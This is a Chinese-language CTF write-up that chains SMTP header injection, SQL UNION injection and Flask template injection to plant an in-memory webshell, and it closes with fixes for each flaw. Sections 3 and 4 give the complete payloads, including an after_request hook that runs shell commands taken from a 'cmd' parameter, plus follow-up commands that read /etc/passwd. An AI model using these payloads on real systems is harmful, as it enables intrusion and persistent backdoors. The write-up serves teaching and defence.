# actf excellent题解

## 1. 挑战代码分析与利用思路

这个CTF挑战涉及一个Flask网站，包含多个安全漏洞。漏洞利用链：

1. SMTP头注入 → 伪造管理员发件人
2. SQL注入 → 注入模板表达式
3. 模板注入 → 执行Python代码
4. 内存马植入 → 获得持久控制

## 2. 关键基础知识讲解

### 2.1 SMTP注入与邮件协议基础

#### 邮件头的基本结构
邮件由头部和正文组成，基本头部包括：
```
From: sender@example.com
To: recipient@example.com
Subject: Email Subject
```

#### SMTP头注入原理
当用户输入被直接拼接到邮件头中时，可以通过注入回车换行(`\r\n`或URL编码`%0d%0a`)来添加新的邮件头：
```
输入: test%0d%0aFrom: admin@example.com
结果:
Subject: test
From: admin@example.com
```

#### 关键点
- SMTP处理邮件头时，对于重复的头字段（如两个From:），**通常会使用最后一个**
- 攻击者可以通过注入新行和新的From头来覆盖原始发件人
- 查找邮件时，如果系统使用`FROM "admin@example.com"`这种方式，被伪造的邮件也会被匹配到

### 2.2 SQL注入与Union回显技术

#### SQL UNION注入基础
UNION操作符用于合并两个或多个SELECT语句的结果：
```sql
SELECT column1 FROM table1 UNION SELECT column2 FROM table2
```

#### 重要特性
1. **当第一个SELECT没有结果时**：UNION仍然会返回第二个SELECT的结果
2. **字符串注入**：`SELECT "任意字符串"` 将直接返回该字符串，不需要实际存在的表
3. **结果合并**：即使前面的查询有结果，也会合并两部分查询的结果

#### 具体应用
```sql
SELECT title FROM news WHERE id = 0 UNION SELECT "{{恶意模板表达式}}"
```
- 即使id=0不存在，整个查询仍然会返回`{{恶意模板表达式}}`
- 这个表达式会被后续代码读取并放入模板渲染函数

## 3. 实战攻击流程

### 步骤1: SMTP头注入伪造发件人
```
URL参数: http://example.com%0d%0aFrom: admin@ezmail.org
```
当系统构造邮件时，邮件会变成：
```
From: ignored@ezmail.org
To: admin@ezmail.org
Subject: http://example.com
From: admin@ezmail.org
```
伪造的From头会覆盖原始发件人，使邮件看起来像是admin发给自己的。

### 步骤2: 构造包含SQL注入的URL
```
URL参数: http://ezmail.org:3000/news?id=0 union select "{{恶意模板表达式}}"
```
当管理员的代码访问这个URL时，SQL注入会触发，使数据库返回我们控制的模板表达式。

### 步骤3: 构造模板注入Payload
```
{{url_for.__globals__['__builtins__']['eval']('app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\'cmd\') and exec(\'global CmdResp;CmdResp=__import__(\\\'flask\\\').make_response(__import__(\\\'os\\\').popen(request.args.get(\\\'cmd\\\')).read())\')==None else resp)',{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
```

这个Payload会：
1. 访问Flask内部对象
2. 执行Python代码
3. 添加一个HTTP请求处理钩子
4. 检查请求参数中是否有`cmd`参数
5. 如果有，执行该命令并返回结果

### 步骤4: 完整Payload组合
```
url=http://ezmail.org:3000/news?id=0 union select "{{url_for.__globals__['__builtins__']['eval']('app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\'cmd\') and exec(\'global CmdResp;CmdResp=__import__(\\\'flask\\\').make_response(__import__(\\\'os\\\').popen(request.args.get(\\\'cmd\\\')).read())\')==None else resp)',{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}";%0d%0aFrom: admin@ezmail.org&content=123
```

### 步骤5: 命令执行
一旦内存马植入成功，只需访问任意页面并添加cmd参数即可执行命令：
```
http://ezmail.org:3000/任意路径?cmd=id
```

## 4. 源代码关键点分析

### SMTP注入点
```python
smtplib._quote_periods = lambda x: x  # 禁用安全转义
mail_content = """From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: {url}\r\n\r\n{content}\r\n.\r\n"""
mail_content = mail_content.format(url=url, content=content)  # 直接拼接用户输入
```

### 伪造邮件检索点
```python
status, messages = mail.search(None, 'FROM "admin@ezmail.org"')  # 仅根据From头过滤
```

### SQL注入点
```python
cursor.execute(f"SELECT title FROM news WHERE id = {news_id}")  # 直接拼接用户输入
```

### 模板注入点
```python
return render_template_string(f"""
        <h2>Newest Advice(from myself)</h2>
        <div>{page_content}</div>
""")  # 将不可信数据放入模板字符串
```

## 5. 防御方法与修复建议

### SMTP注入防御
- 不要禁用安全机制：删除`smtplib._quote_periods = lambda x: x`
- 过滤换行符：`url = url.replace('\r', '').replace('\n', '')`
- 使用专门的邮件库构造邮件

### SQL注入防御
- 使用参数化查询：`cursor.execute("SELECT title FROM news WHERE id = ?", (news_id,))`
- 验证输入类型：`if not news_id.isdigit(): return "Invalid ID"`

### 模板注入防御
- 不直接使用`render_template_string`
- 如需使用，确保内容经过严格净化：`content = escape(content)`

## 6. 实际CTF解题思路

1. **发现线索**：首先检查代码，找到有趣的入口点
   - 注意到SMTP邮件发送
   - 管理员会根据邮件主题访问URL
   - SQL查询直接拼接用户输入

2. **构建攻击链**：思考如何将各漏洞串联起来
   - "如何伪造管理员的邮件？" → SMTP头注入
   - "如何注入自己的代码？" → SQL注入
   - "如何执行代码？" → 模板注入
   - "如何获得持续控制？" → 内存马

3. **逐步测试**：
   - 先测试简单的SMTP头注入
   - 再测试SQL注入是否能返回自定义内容
   - 尝试简单的模板表达式如`{{7*7}}`
   - 最后构建完整的代码执行Payload

4. **获取FLAG**：
   - 部署内存马后，执行命令如`cat /flag`或`ls -la`
   - 如果FLAG在数据库中，可执行SQL语句查询
   - 如果FLAG在内存中，可使用`ps`和`grep`等命令定位

## 7. 额外技巧

- **三重反斜杠的使用**：
  在多层注入中，每一层都需要处理转义：
  - 第一层：SQL中的字符串需要转义
  - 第二层：模板表达式中的字符串需要转义
  - 第三层：eval中的字符串需要转义
  
  所以`\\\'`会在解析过程中变成`\'`再变成`'`

- **实用测试命令**：
  ```
  ?cmd=id                   # 查看当前用户
  ?cmd=ls -la /             # 列出根目录
  ?cmd=cat /etc/passwd      # 查看用户列表
  ?cmd=netstat -antp        # 查看网络连接
  ```

- **内存马持久性**：内存马只在应用不重启的情况下有效，服务器重启后需要重新植入

---

本文档旨在帮助理解CTF挑战中常见的Web安全漏洞链。理解攻击原理是防御的第一步，请在合法授权的环境中练习这些技术。 